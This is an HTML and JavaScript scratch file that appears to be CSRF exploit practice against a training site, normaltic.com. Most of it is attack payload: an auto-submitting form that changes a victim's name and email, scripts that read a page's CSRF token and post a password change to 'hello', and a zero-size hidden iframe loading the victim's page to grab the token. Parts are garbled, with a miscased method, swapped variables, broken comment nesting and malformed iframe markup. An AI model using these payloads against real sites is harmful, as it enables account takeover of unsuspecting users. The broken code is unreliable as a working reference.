<!-- <form method="post" action="mypage_update.php">
    <div class="hori">
        <i class="far fa-user fa-2x" aria-hidden="true"></i>
        <input name="id" type="text" placeholder="tyrell">
    </div>
    <div class="hori">
        <i class="fas fa-birthday-cake fa-2x" aria-hidden="true"></i>
        <input name="birthday" type="text" placeholder="">
    </div>
    <div class="hori">
        <i class="fas fa-lock fa-2x" aria-hidden="true"></i>
        <input name="pw" type="password" placeholder="변경할 비밀번호">
        <input type="hidden" name="csrf_token" value="84a1a185cb101721a81a89bfce2d38f43f99307807eeef0c88214e1f2f85629a">
    </div>
    <div class="hori"><input type="submit" value="Update" id="signup-btnl"></div>
</form>



var xml = new XMLHttpRequest();
var csrf_token0=$('[name=csrf_token]').val();
xml.open("POST", "http://normaltic.com:5002/mypage_update.php", true);

xml.setrequestHeader('csrf_token0', csrf_token);
xml.send()


<form method="POST" action="http://normaltic.com:5001/study/mypage_change_ok.php">
    <input type="text" name="name" value="hacking you">
    <input type="" name="email" value="i hack you">
</form>
<script>
document.forms[0].submit();
</script>


<form method="post" action="http://normaltic.com:5001/study/mypage_change_ok.php">




    <!-- var value = $("#randomdirectory").val(); -->

<!-- 
var token = $("#csrf_token").val();

$.ajax({

url: 'http://normaltic.com:5001/study/mypage_change_ok.php',
type: 'post',
data: {"pw": "hello",
"csrf_token": token},
success: function (data) {
alert("데이터 전송이 성공적으로 끝났을 때 실행");
}
}); --> -->

<iframe id="getCSRFToken" src="http://normaltic.com:5002/mypage.php" width="0" height="0" border="0"">
    onload=" exploit()</iframe>